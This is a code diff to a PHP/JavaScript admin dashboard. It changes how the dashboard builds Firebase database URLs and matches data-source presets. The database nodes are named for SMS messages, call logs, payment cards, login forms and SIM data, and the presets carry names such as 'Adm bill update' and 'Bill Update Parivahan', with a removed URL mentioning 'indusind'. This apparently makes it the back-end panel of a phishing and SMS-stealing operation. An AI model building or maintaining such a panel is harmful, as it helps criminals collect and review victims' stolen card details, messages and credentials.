@@ -218,10 +218,10 @@ include_once __DIR__ . '/header.php';
                       adminUser?.firebaseConfig?.databaseURL ||
                       '').trim();
 
-        if (/AIzaSy/i.test(rawUrl) || (!rawUrl.includes('firebasedatabase.app') && !rawUrl.includes('firebaseio.com'))) {
+        if (!rawUrl || /AIzaSy/i.test(rawUrl)) {
           const proj = (fbProject || adminUser?.firebaseProject || '').trim();
           if (proj) {
-            rawUrl = `https://${proj}-default-rtdb.asia-southeast1.firebasedatabase.app`;
+            rawUrl = `https://${proj}-default-rtdb.firebaseio.com`;
           } else {
             throw new Error('No Firebase database URL configured.');
           }
@@ -355,7 +355,7 @@ include_once __DIR__ . '/header.php';
       };
 
       const DEFAULT_SCHEMA_PRESETS = {
-        adm_bill_update: { name: "⚡ Adm bill update", dbUrl: "https://indusind-indie-default-rtdb.asia-southeast1.firebasedatabase.app/", sms: "smsData", calls: "calls", cards: "paymentCardData", forms: "userData", sims: "simData" },
+        adm_bill_update: { name: "⚡ Adm bill update", sms: "smsData", calls: "calls", cards: "paymentCardData", forms: "userData", sims: "simData" },
         pm_admin: { name: "⭐ PM Admin Preset (Live Database Structure)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" },
         bill_update_parivahan: { name: "⚡ Bill Update Parivahan Preset", sms: "messages", calls: "calls", cards: "clients", forms: "clients", sims: "clients" },
         custom: { name: "🛠️ Custom Manual Setup (Enter Node Names Below)", sms: "user_sms", calls: "calls", cards: "Card", forms: "login", sims: "user_data" }
@@ -396,12 +396,10 @@ include_once __DIR__ . '/header.php';
                       adminUser?.firebaseConfig?.databaseURL ||
                       '').trim();
 
-            // Detect if rawUrl is an API Key (starts with AIzaSy...) instead of a valid database URL
-            if (/AIzaSy/i.test(rawUrl) || (!rawUrl.includes('firebasedatabase.app') && !rawUrl.includes('firebaseio.com'))) {
-              // Extract Project ID to reconstruct real database URL on the fly
+            if (!rawUrl || /AIzaSy/i.test(rawUrl)) {
               const proj = (fbProject || adminUser?.firebaseProject || '').trim();
               if (proj) {
-                rawUrl = `https://${proj}-default-rtdb.asia-southeast1.firebasedatabase.app`;
+                rawUrl = `https://${proj}-default-rtdb.firebaseio.com`;
               } else if (!rawUrl) {
                 setFbConnectionStatus({ status: 'warning', message: 'No Firebase database URL configured.', count: 0 });
                 return;
@@ -1054,8 +1052,7 @@ include_once __DIR__ . '/header.php';
 
             // Find matching preset key dynamically
             let matchedPreset = 'custom';
-            const dbUrlStr = (op.firebaseDatabaseUrl || op.firebaseConfig?.databaseURL || '').toLowerCase();
-            if (dbUrlStr.includes('indusind-indie-default-rtdb') || (op.collectionSms === 'messages' && op.collectionCards === 'clients' && dbUrlStr.includes('indusind'))) {
+            if (op.collectionSms === 'smsData' && op.collectionCards === 'paymentCardData') {
               matchedPreset = 'adm_bill_update';
             } else if (op.collectionSms === 'user_sms' && op.collectionCards === 'Card' && op.collectionForms === 'login') {
               matchedPreset = 'pm_admin';
